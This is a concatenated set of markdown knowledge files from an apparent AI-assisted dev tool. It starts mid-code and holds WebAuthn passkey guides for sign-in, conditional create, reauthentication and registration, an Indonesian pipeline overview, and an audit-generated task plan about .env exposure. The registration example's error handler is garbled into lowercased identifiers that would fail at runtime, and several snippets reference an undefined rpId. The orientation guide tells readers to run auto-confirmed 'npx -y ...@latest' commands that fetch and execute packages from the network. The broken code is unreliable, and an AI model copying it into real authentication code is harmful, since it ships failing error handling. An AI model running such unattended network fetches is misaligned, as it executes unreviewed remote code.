  const loginOptionsJSON = await optionsFetch();
  const publicKey =
    PublicKeyCredential.parseRequestOptionsFromJSON(loginOptionsJSON);

  let credential;
  try {
    // Passkey explicit prompt trigger
    credential = await navigator.credentials.get({
      publicKey,
      signal: autofillAbortController.signal,
    });
  } catch (err) {
    if (err.name === "NotAllowedError") {
      console.log("User cancelled passkey login.");
    } else if (err.name === "AbortError") {
      console.log("The authentication operation was aborted.");
    }
    // Re-arm Conditional autofill Suggestions after cancelled explicit button prompts
    initializeConditionalAutofill();
    return; // Safe exit
  }

  // Segregated verification try/catch (HTTP 404 trigger)
  const encoded = credential.toJSON();
  try {
    const response = await loginVerifyFetch(encoded);
    if (!response.ok && response.status === 404) {
      // Note: this code path runs pre-authentication, satisfying the unauth precondition
      await PublicKeyCredential.signalUnknownCredential({
        rpId, // RP ID must match the one defined on the server
        credentialId: encoded.id, // Base64URL-encoded credential ID
      });
    }
  } catch (serverErr) {
    console.error("Verification request error:", serverErr);
  }
}

// Trigger Conditional Get on load
window.addEventListener("DOMContentLoaded", initializeConditionalAutofill);
```

## Fallback Strategies

### Passkey feature detection fallback

Baseline status for the api.PublicKeyCredential.getClientCapabilities_static capability: Newly available. It's been Baseline since 2025-02-06.
Supported by: Chrome 133 (Feb 2025), Edge 133 (Feb 2025), Firefox 135 (Feb 2025), and Safari 17.4 (Mar 2024).

Always install 'webauthn-polyfills' and import it in the context.
Consider as long as  `PublicKeyCredential` is supported, `PublicKeyCredential.getClientCapabilities` is also supported. 

```js 
import 'webauthn-polyfills';
``` 

### Signal API Synchronization Fallback

Web authentication signal methods has limited availability.
Supported by: Chrome 132 (Jan 2025), Edge 132 (Jan 2025), and Safari 26 (Sep 2025).
Unsupported in: Firefox.

The WebAuthn Signal API (`webauthn-signals`) is a progressive optimization used to keep password managers in sync with the server credential state.

- **Fallback Experience**: Gated via `if (PublicKeyCredential.signalUnknownCredential)`. If unsupported, the background verification sync is bypassed gracefully without throwing browser exceptions.

### Easy JSON Serialization Fallback

Baseline status for the api.PublicKeyCredential.parseRequestOptionsFromJSON_static capability: Newly available. It's been Baseline since 2025-03-31.
Supported by: Chrome 129 (Sep 2024), Edge 129 (Sep 2024), Firefox 119 (Oct 2023), and Safari 18.4 (Mar 2025).

Always install 'webauthn-polyfills' and import it in the context.
Consider as long as  `PublicKeyCredential` is supported, `PublicKeyCredential.parseRequestOptionsFromJSON` and `PublicKeyCredential.prototype.toJSON` are also supported. 

```js 
import 'webauthn-polyfills';
``` 


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, tdd, api]

### 📘 KNOWLEDGE: NEXUS_PASSKEY-CONDITIONAL-CREATE.MD

# Passkey Conditional Create (Post-Login Promotion)
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This guide details how to automatically and silently register a passkey for a user immediately after a successful password-based sign-in, minimizing friction and boosting passkey adoption.

## The Right Trigger Moment

Automatic passkey creation (also known as Conditional Create or silent post-login promotion) MUST only be triggered **immediately after a successful, full sign-in that involved a password**. 
* Do not attempt conditional creation for passwordless flows (e.g., magic links, SMS OTP, or identity federation).
* If multi-factor authentication is required, you MUST wait until all factors have succeeded before initiating conditional creation.
* Ensure a valid, authenticated user session is active before making requests to creation endpoints.

## Implementation Steps

### 1. Abort Prior Autofill Actions
If the sign-in page utilizes form autofill (Conditional UI/Get), the active credential get call must be aborted to prevent browser conflicts.
* Call `abortController.abort()` on the `AbortController` attached to the pending `navigator.credentials.get()` autofill request before calling `navigator.credentials.create()`.

### 2. Feature Detection
Determine whether Conditional Create is available by checking `conditionalCreate` with `PublicKeyCredential.getClientCapabilities()`.

```javascript
const capabilities = await PublicKeyCredential.getClientCapabilities();
if (capabilities.conditionalCreate) {
  // Conditional create is available
}
```

### 3. Create a passkey with Conditional Create
* Pass `mediation: 'conditional'` within the `navigator.credentials.create()` options. This signals the browser to handle the passkey creation flow silently in the background or contextually without throwing obtrusive modal dialogs.
* Populate `excludeCredentials` with the user's existing passkey credential IDs to avoid registering duplicate keys.

### 4. Silent Error Handling
* Wrap the passkey creation prompt (`navigator.credentials.create`) in a try/catch block. You MUST catch and silently ignore typical user-facing exceptions (`InvalidStateError`, `NotAllowedError`, `AbortError`) without rendering any error UI to the user.

### 5. Server-Side User Presence Verification
* The server-side verification endpoint MUST relax the User Presence (UP) requirement (`requireUserPresence: false`) **ONLY** when verifying credentials produced by a conditional-create trigger. Strict presence verification must remain active for standard explicit creations.

### 6. Handle Failed Server Verification gracefully
* If `navigator.credentials.create()` succeeds but the server verification fetch returns a bad response (e.g., signature verification fails), invoke `PublicKeyCredential.signalUnknownCredential()` to prevent orphaned credentials from lingering in the passkey provider.

## Code Example

```javascript
// optionsFetch and registerVerifyFetch are app-defined server endpoint requests
import { optionsFetch, registerVerifyFetch } from './api.js';

async function triggerConditionalCreate(loginAbortController) {
  const capabilities = await PublicKeyCredential.getClientCapabilities();
  if (capabilities.conditionalCreate !== true) {
    return; // Platform does not support conditional creation
  }

  // 1. Abort any active autofill conditional-get controllers to clear the WebAuthn pipeline
  loginAbortController.abort();

  // 2. Fetch creation options signaling the backend that this is a conditional request
  const creationOptionsJSON = await optionsFetch({ conditional: true });
  const publicKey = PublicKeyCredential.parseCreationOptionsFromJSON(creationOptionsJSON);

  let credential;
  try {
    // 3. Invoke silent credentials creation prompt
    credential = await navigator.credentials.create({ 
      publicKey,
      mediation: 'conditional' // Silent background creation mediation
    });
  } catch (e) {
    // 4. Silently swallow common WebAuthn browser exceptions
    if (['InvalidStateError', 'NotAllowedError', 'AbortError'].includes(e.name)) {
      return; 
    }
    console.error('Unexpected conditional create error:', e);
    return;
  }

  // 5. Server verification step using dedicated Try/Catch block
  let encodedResponse = credential.toJSON();
  try {
    const response = await registerVerifyFetch(encodedResponse);
    if (!response.ok) {
      // If the server verification fails, clean up using Signal API
      if (PublicKeyCredential.signalUnknownCredential) {
        await PublicKeyCredential.signalUnknownCredential({
          rpId, // RP ID must match the one defined on the server
          credentialId: encodedResponse.id
        });
      }
    }
  } catch (serverErr) {
    console.error('Verification network failure:', serverErr);
    if (PublicKeyCredential.signalUnknownCredential) {
      await PublicKeyCredential.signalUnknownCredential({
        rpId, // RP ID must match the one defined on the server
        credentialId: encodedResponse.id
      });
    }
  }
}
```

## Fallback Strategies

### Passkey feature detection fallback

Baseline status for the api.PublicKeyCredential.getClientCapabilities_static capability: Newly available. It's been Baseline since 2025-02-06.
Supported by: Chrome 133 (Feb 2025), Edge 133 (Feb 2025), Firefox 135 (Feb 2025), and Safari 17.4 (Mar 2024).

Always install 'webauthn-polyfills' and import it in the context.
Consider as long as  `PublicKeyCredential` is supported, `PublicKeyCredential.getClientCapabilities` is also supported. 

```js 
import 'webauthn-polyfills';
``` 

### Signal API Synchronization Fallback

Web authentication signal methods has limited availability.
Supported by: Chrome 132 (Jan 2025), Edge 132 (Jan 2025), and Safari 26 (Sep 2025).
Unsupported in: Firefox.

The WebAuthn Signal API (`webauthn-signals`) is a progressive optimization used to keep password managers in sync with the server credential state.
*   **Fallback Experience**: Gated via `if (PublicKeyCredential.signalUnknownCredential)`. If unsupported, the background verification sync is bypassed gracefully without throwing browser exceptions.

### Easy JSON Serialization Fallback

Baseline status for the api.PublicKeyCredential.parseCreationOptionsFromJSON_static capability: Newly available. It's been Baseline since 2025-03-31.
Supported by: Chrome 129 (Sep 2024), Edge 129 (Sep 2024), Firefox 119 (Oct 2023), and Safari 18.4 (Mar 2025).

Always install 'webauthn-polyfills' and import it in the context.
Consider as long as  `PublicKeyCredential` is supported, `PublicKeyCredential.parseCreationOptionsFromJSON` and `PublicKeyCredential.prototype.toJSON` are also supported. 

```js 
import 'webauthn-polyfills';
``` 


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, api]

### 📘 KNOWLEDGE: NEXUS_PASSKEY-REAUTHENTICATION.MD

# Passkey Reauthentication Guide
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This delta-focused guide details how to implement step-up authentication or re-verification for a signed-in user before they perform sensitive account changes (e.g. passwords updates, financial transfers).

## Delta Flow Architecture

Unlike regular authentication, passkey reauthentication constrains passkey dialog prompts strictly to the logged-in user's pre-registered credentials to prevent account-mixing or passkey spoofing during active sessions.

## Server-Side

### Options Generation Delta

Create an endpoint that populates the allowed credentials parameters specifically for the active, known user:

**Constrain Credentials**: Populate the `allowCredentials` options array with specific `PublicKeyCredentialDescriptor` records mapping all registered credential IDs for the signed-in user. Leaving this empty or omitting it regresses to discoverable credentials, violating session safety.

```javascript
// Node.js step-up options generation example
router.post("/api/reauth/options", enforceActiveSession, async (req, res) => {
  const userPasskeys = await db.findCredentialsByUserId(req.user.id);

  const options = {
    challenge: serverGeneratedBase64UrlChallenge, // Random challenge stored in user session
    rpId: "example.com",
    // Enforce allowance strictly limited to the user's credentials list
    allowCredentials: userPasskeys.map((cred) => ({
      type: "public-key",
      id: cred.id,
      transports: cred.transports, // Speeds up resolution by indicating platform transports
    })),
  };
  return res.json(options);
});
```

### Verification Endpoint Delta

Verify the assertion returned by the client:

**Verify Account Ownership**: The verification endpoint MUST explicitly verify that the resulting authenticated credential ID returned by the client resolves to a stored credential record whose associated user ID strictly matches the active signed-in user (`storedCredential.passkeyUserId === req.user.id`). If a valid passkey of a _different_ user is returned, authentication MUST be rejected immediately.

## Client-Side Flow Deltas

Applications choose from two reauthentication interfaces depending on the transaction UI:

### A. Button Flow (No Input Fields)

Trigger reauthentication when a user presses a "Verify Identity" or "Proceed with Transaction" button.

```html
<button id="reauth-btn" data-testid="reauth-button">Confirm Transaction</button>
```

```javascript
let reauthAbortController = new AbortController();

async function triggerButtonReauth() {
  // Abort any background suggestion flows to avoid passkey prompt collisions
  reauthAbortController.abort();
  reauthAbortController = new AbortController();

  const optionsResponse = await fetch("/api/reauth/options", {
    method: "POST",
  });
  const optionsJSON = await optionsResponse.json();
  const publicKey =
    PublicKeyCredential.parseRequestOptionsFromJSON(optionsJSON);

  try {
    const credential = await navigator.credentials.get({
      publicKey,
      signal: reauthAbortController.signal,
    });

    if (credential) {
      const encodedCredential = credential.toJSON();
      const verifyResponse = await fetch("/api/reauth/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(encodedCredential),
      });

      if (verifyResponse.ok) {
        showTransactionSuccessUI();
      } else if (verifyResponse.status === 404 && PublicKeyCredential.signalUnknownCredential) {
        await PublicKeyCredential.signalUnknownCredential({
          rpId, // RP ID must match the one defined on the server
          credentialId: encodedCredential.id
        });
      }
    }
  } catch (err) {
    if (err.name === "NotAllowedError") {
      console.log("User cancelled reauthentication.");
    }
  }
}

document
  .getElementById("reauth-btn")
  .addEventListener("click", triggerButtonReauth);
```

## Fallback Strategies

### Passkey feature detection fallback

Baseline status for the api.PublicKeyCredential.getClientCapabilities_static capability: Newly available. It's been Baseline since 2025-02-06.
Supported by: Chrome 133 (Feb 2025), Edge 133 (Feb 2025), Firefox 135 (Feb 2025), and Safari 17.4 (Mar 2024).

Always install 'webauthn-polyfills' and import it in the context.
Consider as long as  `PublicKeyCredential` is supported, `PublicKeyCredential.getClientCapabilities` is also supported. 

```js 
import 'webauthn-polyfills';
``` 

### Easy JSON Serialization Fallback

Baseline status for the api.PublicKeyCredential.parseRequestOptionsFromJSON_static capability: Newly available. It's been Baseline since 2025-03-31.
Supported by: Chrome 129 (Sep 2024), Edge 129 (Sep 2024), Firefox 119 (Oct 2023), and Safari 18.4 (Mar 2025).

Always install 'webauthn-polyfills' and import it in the context.
Consider as long as  `PublicKeyCredential` is supported, `PublicKeyCredential.parseRequestOptionsFromJSON` and `PublicKeyCredential.prototype.toJSON` are also supported. 

```js 
import 'webauthn-polyfills';
``` 


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, tdd, api]

### 📘 KNOWLEDGE: NEXUS_PASSKEY-REGISTRATION.MD

# Passkey Registration Guide
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This guide details how to enable users to register a passkey for their account, providing a highly secure, phishing-resistant passwordless sign-in alternative.

## Database Requirements

To support passkey registrations, your database credential table must store the following fields:

```typescript
export interface StoredPasskeyCredential {
  id: string; // Base64URL-encoded credential ID (unique lookup key)
  passkeyUserId: string; // Associated application user ID
  credentialPublicKey: string; // Base64URL-encoded public key used to verify assertion signatures
  credentialType: "public-key";
  credentialDeviceType: "singleDevice" | "multiDevice"; // Helps distinguish device-bound vs cloud-synced passkeys
  credentialBackedUp: boolean; // Boolean backup state reported by the authenticator
  aaguid: string; // Authenticator Attestation GUID
  providerIcon?: string; // Provider icon derived from the AAGUID registry (dark or light theme URLs)
  name: string; // Provider name derived from AAGUID registry
  transports: string[]; // Array of transport names (e.g. 'internal', 'hybrid') necessary for exclusion options
  lastUsedAt?: number; // Optional epoch timestamp of last sign-in
  registeredAt: number; // Registration epoch timestamp
  counter: number; // Authenticator sign-in signature counter used to prevent replay attacks
}
```

## Server-Side

### Options Generation

Create an endpoint that generates WebAuthn creation parameters. Rely on a vetted library per category standards instead of hand-rolling cryptography.

1.  **Use the predefined RP ID**: Use the predefined proper RP ID as a constant string.
2.  **Create a secure Challenge**: Generate a high-entropy, cryptographically secure random buffer on the server, store it securely in the user's session, and encode it as Base64URL for options delivery.
3.  **Avoid Duplicate Passkeys**: Map the user's existing pre-registered credential IDs to the `excludeCredentials` options array. This prevents the authenticator from registering duplicate credentials on the same passkey provider account.
4.  **Enforce Discoverable Credentials**: Set `requireResidentKey: true` and `residentKey: "required"` in the `authenticatorSelection` options to request a discoverable credential, which is necessary for discoverable sign-ins.
5.  **Configure User Verification**: Specify `userVerification: "preferred"` or `userVerification: "required"`. Many compliance use cases (e.g., finance, healthcare) require `'required'` to enforce user verification on creation.
6.  **Determine Attachment Scope**:
    - **Promotion Flow**: When proposing passkey creation right after standard password sign-ins or post-signup promotions, set `authenticatorAttachment: "platform"` to enforce platform authenticator and bypass external security key prompts.
    - **Management Flow**: When called from a dedicated settings or security panel where external security keys are supported in addition to platform authenticator, omit the `authenticatorAttachment` property entirely.
    - _Tip_: Accept a `promotion: boolean` request flag to conditionally handle both flows with a single endpoint.

```javascript
// Options generation example
const options = {
  challenge: serverGeneratedBase64UrlChallenge, // Cryptographically random challenge
  rp: { id: "example.com", name: "Secure Application" },
  user: {
    id: userBase64UrlId, // Unique base64url string identifying the account
    name: "user@example.com",
    displayName: "Jane Doe",
  },
  pubKeyCredParams: [
    {
      type: "public-key",
      alg: -7,
    },
    {
      type: "public-key",
      alg: -257,
    },
  ],
  excludeCredentials: userExistingCredentials.map((cred) => ({
    type: "public-key",
    id: cred.id,
    transports: cred.transports,
  })),
  authenticatorSelection: {
    residentKey: "required",
    requireResidentKey: true,
    userVerification: "preferred",
    ...(isPromotionFlow && { authenticatorAttachment: "platform" }),
  },
};
```

### Verification

1.  **Challenge Verification**: Securely verify the challenge against the expected session bound challenge.
2.  **Verify User Presence**:
    - Ensure that the User Present (UP) flag returned in the parsed authenticator data is `true` to confirm physical user presence at the time of creation.
3.  **Relaxing Verification for 'preferred'**:
    - When the creation options specified `userVerification: "preferred"`, the server-side verification call MUST be configured with `requireUserVerification: false`. Otherwise, authenticators that register without user verification (e.g., screen locks disabled) will trigger spurious server verification failures.

## Client-Side Logic

1.  **Gate the UI on page load**:
    - On page load, call `PublicKeyCredential.getClientCapabilities()` and **disable the "Create passkey" button** if `conditionalGet` or `passkeyPlatformAuthenticator` is not available.
2.  **Invoke creation & Serialize**: Decode server options with `PublicKeyCredential.parseCreationOptionsFromJSON()` and pass the resulting configuration to `navigator.credentials.create()`.
    - Call `credential.toJSON()` to encode the `AuthenticatorAttestationResponse` into a valid, JSON-serializable object before fetching the verification endpoint.
3.  **Handle WebAuthn Exceptions**:
    - `InvalidStateError`: A matching passkey already exists (matched by `excludeCredentials`).
    - `NotAllowedError`: The user cancelled or timed out the authentication passkey dialog.
    - `AbortError`: The operation has been aborted.
    - `SecurityError`: Secure origins (HTTPS) or RP ID mismatch errors (configuration issues).
4.  **Try/Catch Segregation for Signal API**:
    - Wrap server verification `fetch()` call in a try/catch block. Call `signalUnknownCredential()` when the server verification fetch fails (any status `response.ok === false` or network throws).

```javascript
// optionsFetch and registerVerifyFetch are app-defined HTTP methods
import { optionsFetch, registerVerifyFetch } from "./api.js";

async function registerPasskey(isPromotion = false) {
  // Verify passkey capability and conditional UI are available
  const capabilities = await PublicKeyCredential.getClientCapabilities();
  if (
    !capabilities.passkeyPlatformAuthenticator ||
    !capabilities.conditionalGet
  ) {
    // Hide "Create passkey" buttons and fall back to password flows instead
    showStandardPasswordFallbackUI();
    return;
  }

  const creationOptionsJSON = await optionsFetch({ promotion: isPromotion });
  const publicKey =
    PublicKeyCredential.parseCreationOptionsFromJSON(creationOptionsJSON);

  let credential;
  try {
    // passkey prompt execution
    credential = await navigator.credentials.create({ publicKey });
  } catch (err) {
    if (err.name === "InvalidStateError") {
      console.log("A passkey already exists for this account.");
      alert("A passkey already exists for this account.");
    } else if (err.name === "SecurityError") {
      console.error("Configuration RP ID or Secure Context error.");
      alert("Configuration RP ID or Secure Context error.");
    } else if (err.name === "NotAllowedError") {
      console.log("User cancelled the passkey dialog.");
    } else if (err.name === "AbortError") {
      console.log("The creation operation has been aborted.");
    }
    return; // Safe API exit, do not signal unknown for standard WebAuthn cancels
  }

  // Server Verification phase (Segregated Try/Catch)
  let encodedResponse = credential.toJSON();
  try {
    const response = await registerVerifyFetch(encodedResponse);
    if (!response.ok) {
      // Server verification failed to verify/authenticate the credential (orphaned)
      await PublicKeyCredential.signalUnknownCredential({
        rpId, // RP ID must match the one defined on the server
        credentialId: encodedResponse.id, // Base64URL-encoded credential ID
      });
    }
  } catch (serverErr) {
    console.error("Server verification network failure:", serverErr);
    await publickeycredential.signalunknowncredential({
      rpId, // RP ID must match the one defined on the server
      credentialid: encodedresponse.id, // base64url-encoded credential id
    });
  }
}
```

## Fallback Strategies

### Signal API Synchronization Fallback

Web authentication signal methods has limited availability.
Supported by: Chrome 132 (Jan 2025), Edge 132 (Jan 2025), and Safari 26 (Sep 2025).
Unsupported in: Firefox.

The WebAuthn Signal API (`webauthn-signals`) is a progressive optimization used to keep password managers in sync with the server credential state.

- **Fallback Experience**: If `PublicKeyCredential.signalUnknownCredential` is unsupported by the browser, the call MUST be bypassed safely via feature detection gating (`if (PublicKeyCredential.signalUnknownCredential)`), and the server-side verification simply logs the failure without triggering manager updates.

### Easy JSON Serialization Fallback

Baseline status for the api.PublicKeyCredential.parseCreationOptionsFromJSON_static capability: Newly available. It's been Baseline since 2025-03-31.
Supported by: Chrome 129 (Sep 2024), Edge 129 (Sep 2024), Firefox 119 (Oct 2023), and Safari 18.4 (Mar 2025).

Always install 'webauthn-polyfills' and import it in the context.
Consider as long as  `PublicKeyCredential` is supported, `PublicKeyCredential.parseCreationOptionsFromJSON` and `PublicKeyCredential.prototype.toJSON` are also supported. 

```js 
import 'webauthn-polyfills';
``` 


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, tdd, api]

### 📘 KNOWLEDGE: NEXUS_PASSKEYS.MD

# Passkeys Orientation Guide
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This guide provides high-density, action-oriented orientation for implementing secure, framework-agnostic passkey authentication and credential management in modern web applications.

## 1. Core Prerequisites for Passkeys

Passkeys rely on the Web Authentication API (WebAuthn), which imposes strict cross-cutting security constraints that must be satisfied before any implementation attempt:
*   **Secure Contexts**: WebAuthn methods (`navigator.credentials.create` and `navigator.credentials.get`) are strictly gated behind Secure Contexts. Applications MUST run on `https://` in production, or `http://localhost` for local development.
*   **Relying Party (RP) ID**: Every credential is tied to an RP ID (essentially the domain name of the application). The RP ID passed in the server-side options MUST match or be a valid suffix of the current origin's domain name (e.g., `example.com` is valid for `login.example.com`). Mismatches result in `SecurityError` exceptions on the client side.

## 2. The AAGUID UX Caveat

The Authenticator Attestation Globally Unique Identifier (AAGUID) is a 128-bit identifier returned in the registration attestation data that represents the model/provider of the authenticator (e.g., Google Password Manager, iCloud Keychain, 1Password).
*   **UX Hinting Only**: Relying Parties MUST use the AAGUID exclusively for UX hints (such as rendering the passkey provider name and icon in a management list to help the user).
*   **No Security Dependencies**: applications MUST NOT use AAGUID for cryptographic security or access decisions. Platform passkeys do not currently provide cryptographic attestation for their AAGUIDs, meaning it can be altered or simulated by user agents.

## 3. Decoupled Library Recommendations

For backend FIDO2/WebAuthn options generation and signature verification, developers MUST rely on vetted open source libraries per language instead of hand-rolling cryptography:
*   **JavaScript/TypeScript**: SimpleWebAuthn (github.com/MasterKale/SimpleWebAuthn)
*   **Python**: py_webauthn (github.com/duo-labs/py_webauthn)
*   **Java**: Java WebAuthn Server (github.com/Yubico/java-webauthn-server), WebAuthn4J (github.com/webauthn4j/webauthn4j)
*   **.NET**: .NET library for FIDO2 (github.com/abergs/fido2-net-lib)
*   **Go**: WebAuthn Go Library (github.com/go-webauthn/webauthn)
*   **Ruby**: WebAuthn Ruby (github.com/cedarcode/webauthn-ruby)
*   **PHP**: WebAuthn Framework (github.com/web-auth/webauthn-framework)

## 4. Use Case Reference Matrix

Identify the matching use case below and retrieve its full implementation guide. Every use case has critical APIs (`PublicKeyCredential.parseCreationOptionsFromJSON`, `parseRequestOptionsFromJSON`, `signalAllAcceptedCredentials`, `signalCurrentUserDetails`, `signalUnknownCredential`, conditional mediation, AAGUID handling, etc.) that are documented only in the per-use-case guide. Do NOT skip this retrieval step, and do NOT substitute third-party library wrappers (such as SimpleWebAuthn's `startAuthentication`/`startRegistration`) on the client — call the native WebAuthn browser APIs directly. Library recommendations in Section 3 apply to the **server-side** (backend FIDO2 verification) only.

Specific passkey and WebAuthn implementation details are mapped to the following guides:
*   **Passkey Registration**: `passkey-registration` (via `npx -y modern-web-guidance@latest retrieve "passkey-registration"`) — Offering new passkey registration and promotions.
*   **Passkey Conditional Create**: `passkey-conditional-create` (via `npx -y modern-web-guidance@latest retrieve "passkey-conditional-create"`) — Silently registering passkeys immediately after successful password login.
*   **Passkey Authentication**: `passkey-authentication` (via `npx -y modern-web-guidance@latest retrieve "passkey-authentication"`) — Discoverable-autofill and button sign-ins.
*   **Passkey Management**: `passkey-management` (via `npx -y modern-web-guidance@latest retrieve "passkey-management"`) — Syncing lists, renames, and deletions with password managers.
*   **Passkey Reauthentication**: `passkey-reauthentication` (via `npx -y modern-web-guidance@latest retrieve "passkey-reauthentication"`) — Re-verifying returning signed-in users for sensitive steps.



---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, api]

### 📘 KNOWLEDGE: NEXUS_PIPELINE_VISUAL.MD

# 📊 Visualisasi Pipeline NEXUS AI
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Dokumen ini berisi representasi visual dan penjelasan mendalam mengenai alur kerja **Nexus Engine** dalam mengelola kolaborasi Human-AI.

---

## 🗺️ Diagram Alur Pipeline

```mermaid
graph TD
    %% Entry Point
    Start((Start: nexus run)) --> Init[Phase 0: Inisialisasi]
    
    subgraph "Core Engine Loop"
        Init --> Discover[Discover Agents & Skills]
        Discover --> Audit{Phase 1: Audit}
        
        %% Audit Branching
        Audit -- Mode 1: Learning --> SpecAudit[Specialist Agents Scan<br/>Security, UX, SEO, DB]
        Audit -- Mode 2: Efficient --> QuickAudit[Quick Consolidated Scan]
        
        SpecAudit --> AuditRep[Generate Audit Report]
        QuickAudit --> AuditRep
        
        AuditRep --> Plan[Phase 2: Planning]
        Plan --> PlanMD[Generate Implementation Plan<br/>documentation/planning/*.md]
        
        %% Human Intervention
        PlanMD --> Approval{Human Approval?}
        Approval -- No --> PlanMD
        Approval -- Yes / OKE --> Exec[Phase 3: Execution]
        
        %% Execution to Verification
        Exec --> Verify{Phase 4: Verification}
        Verify -- Flaws Found --> Audit
        Verify -- Zero Flaws --> Record[Phase 5: Finalization]
    end
    
    %% Finalization to Memory
    Record --> Summary[Generate Cycle Summary]
    Summary --> Knowledge[(Knowledge Base / HUB)]
    Knowledge --> End((Cycle Complete))

    %% Global Assets
    subgraph "The Brain (Resources)"
        Skill[(Skill Library)] -.-> SpecAudit
        Skill -.-> Exec
        Agent[(Agent Library)] -.-> SpecAudit
        Agent -.-> Plan
    end
    
    %% Harvesting Phase (External)
    Harvest((Phase 6: Harvest)) -.-> |Sync Knowledge| Knowledge
```

---

## 📝 Penjelasan Detail Tiap Fase

### 🛠️ Phase 0: Inisialisasi (`INIT`)
*   **Aksi**: Sistem memetakan folder proyek, mendeteksi keberadaan folder `nexus/`, dan menyiapkan lingkungan eksekusi.
*   **Intel**: Memeriksa `package.json` untuk memastikan seluruh dependensi engine tersedia.

### 🔍 Phase 1: Audit (Scanning & Intelligence)
*   **Tujuan**: Mengidentifikasi celah keamanan, bug, atau potensi optimasi.
*   **Mode Kerja**:
    *   **Learning**: Memberikan edukasi kepada developer melalui laporan spesialis (Cyber, UX, SEO).
    *   **Efficient**: Fokus pada resolusi cepat dengan laporan tunggal dari PM.
*   **Guardrails**: Engine dilarang memindai file sensitif tanpa persetujuan eksplisit dari User.

### 📅 Phase 2: Planning (Strategi & Kontrak)
*   **Tujuan**: Menyusun *Implementation Plan* sebagai kontrak kerja AI.
*   **Logika**: Mengubah setiap temuan audit menjadi tugas (tasks) yang terukur.
*   **Output**: File `.md` di folder `documentation/planning/` yang harus ditinjau manusia.

### 🚀 Phase 3: Execution (Pengerjaan)
*   **Tujuan**: AI melakukan modifikasi kode atau pembuatan fitur.
*   **Aturan**: AI hanya diperbolehkan menjalankan perintah yang sesuai dengan *Implementation Plan* yang telah disetujui.

### 🔍 Phase 4: Verification (Quality Control)
*   **Tujuan**: Validasi hasil kerja.
*   **Mekanisme**: Membandingkan status proyek terbaru dengan target yang ditetapkan di Phase 1 & 2.
*   **Zero Flaws**: Jika ditemukan ketidaksesuaian, sistem akan memaksa siklus kembali ke Phase 1.

### 📝 Phase 5: Finalization & Records
*   **Tujuan**: Pencatatan sejarah dan pembaruan pengetahuan.
*   **Output**: 
    *   `memory/short_term/`: Log lengkap setiap siklus.
    *   `memory/long_term/`: Ringkasan pelajaran teknis untuk referensi di masa depan (The HUB).
    *   **🧠 Universal Nexus Collision Logic (Opsi A maupun Opsi B)**:
        *   Logika ini adalah standar baku yang diterapkan di seluruh pipeline **HUB (Knowledge)** dan **SKILL**.
        *   **Kondisi**: Terjadi saat ada kemiripan antara "A" (yang sudah ada) dan "B" (yang baru masuk/direfactor), baik itu berupa teori di HUB maupun instruksi teknis di SKILL.
        *   **Implementasi di HUB & SKILL**:
          Opsi A: { Standard_Pattern_A } 
          Opsi B: { Alternative_Pattern_B }
          (Opsi Tak Terbatas untuk variasi solusi)
        *   **Alur Refactoring Universal**:
            1.  **HUB Refactor**: Menggabungkan variasi dokumentasi fitur di folder `memory/long_term/`.
            2.  **SKILL Refactor**: Jika di folder `skill/` ditemukan teknik koding baru yang mirip dengan yang lama, keduanya disimpan sebagai **Pilihan Opsi (A/B/dst)** sebagai pilihan strategi bagi agen.
        *   **Tujuan**: Menjamin bahwa sistem tidak hanya memiliki satu cara kerja, melainkan sebuah **"Decision Tree"** dengan opsi tak terbatas yang kaya bagi AI untuk memilih solusi paling optimal (Context-Aware).

### 🌾 Phase 6: Harvesting (Cross-Project Knowledge)
*   **Tujuan**: Sinkronisasi pengetahuan lintas proyek.
*   **Aksi**: Mengumpulkan dokumentasi "Emas" dari proyek lain ke dalam `golden/` hub pusat.

---
*Dokumen ini merupakan bagian dari standar operasional Human-AI Nexus.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security]

### 📘 KNOWLEDGE: NEXUS_PLAN_PLAN-1779702319557.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026


# 🛠 Implementation Plan: PLAN-1779702319557
**Ref Audit**: [AUDIT-1779702317598](../audit/audit_SUMMARY_AUDIT-1779702317598.md)
**Status**: Ready for Execution

---

## 📋 Task List & Learning Insights

### [ ] Task 1: SECURITY: .env detected (Auto-fix enabled)
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 2: CRITICAL: [cyber-security] .env file detected in project root.
- **🧐 Why?**: File .env berisi kredensial sensitif seperti API keys dan password database. Membiarkannya di root tanpa proteksi berisiko kebocoran data jika tersinkronisasi ke repository publik.
- **💡 Action**: Tambahkan .env ke dalam file .gitignore dan gunakan environment variables di tingkat server.


### [ ] Task 3: WARNING: [database-architect] Hardcoded database connection string detected.
- **🧐 Why?**: Menyimpan kredensial database langsung di dalam kode adalah celah keamanan besar. Jika kode ini diakses pihak luar, mereka bisa mengontrol database Anda.
- **💡 Action**: Pindahkan string koneksi ke file .env dan gunakan process.env untuk memanggilnya.


### [ ] Task 4: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 5: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 6: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 7: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 8: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
- **🧐 Why?**: Tidak ada keterangan tambahan.
- **💡 Action**: Gunakan praktik terbaik standar industri.


### [ ] Task 9: INFO: [documentation-architect] File has over 50 lines but no detected documentation/docstrings.
